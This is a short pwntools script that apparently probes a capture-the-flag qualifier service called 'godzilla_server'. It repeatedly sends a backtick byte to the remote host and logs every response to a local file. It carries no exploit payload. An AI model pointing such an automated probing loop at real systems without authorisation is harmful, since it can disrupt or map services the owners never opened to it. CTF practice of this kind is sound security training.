#!/usr/bin/env python
from pwn import *

context.arch = "amd64"
binary_name = "./godzilla_server"
# conn = process(binary_name)
conn = remote("godzilla_3751355706cae43e14bd797a16946483.quals.shallweplayaga.me", 11577)

data_file = "./data9"

with open(data_file, "w") as f:
    f.write('')


payload = "\x01\x00\x00\x00"
done = None
i = 0
while done == None:
    payload = '`'
    
    while conn.can_recv():
        print 'recving, count = ' + str(i) 
        rec = conn.recv()
        with open(data_file, "a") as f:
          f.write(rec)
        print rec

    # print payload
    try:
        conn.send(payload)
    except:
        pass
    # sleep(0.001)
    # done = #conn.poll()
    # print done
    i +=1
    # print i

    # conn.
    # sleep(1)
    # conn.interactive()
